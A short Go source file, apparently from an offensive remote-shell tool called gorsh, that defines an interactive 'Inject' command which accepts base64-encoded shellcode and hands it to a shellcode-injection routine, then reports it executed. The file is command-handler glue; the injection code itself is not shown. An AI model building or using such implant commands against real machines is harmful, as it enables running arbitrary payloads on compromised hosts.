package cmds

import (
	"git.hyrule.link/blink/gorsh/pkg/shell"

	"github.com/abiosoft/ishell"
)

func Inject(c *ishell.Context) {
	if len(c.Args) != 1 {
		c.Println("needs 1 arg")
	}
	b64Shellcode := c.Args[0]
	shell.InjectShellcode(b64Shellcode)
	c.Printf("Shellcode executed\n")
}
